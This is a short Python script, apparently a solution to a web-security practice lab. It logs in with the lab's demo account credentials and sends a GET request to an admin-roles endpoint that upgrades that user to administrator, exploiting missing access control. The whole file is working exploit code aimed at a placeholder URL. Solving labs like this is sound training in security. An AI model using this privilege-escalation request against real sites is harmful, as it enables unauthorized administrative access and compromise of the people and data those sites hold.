import requests
import re

target = 'YOUR_URL'

path_exploit="/admin-roles?username=wiener&action=upgrade"
path_login="/login"

session=requests.session()

res_login=session.post(target+path_login, data={
    "username" : "wiener",
    "password" : "peter"
})

res_exploit=session.get(target+path_exploit)

print(res_exploit.status_code)
print(res_exploit.text)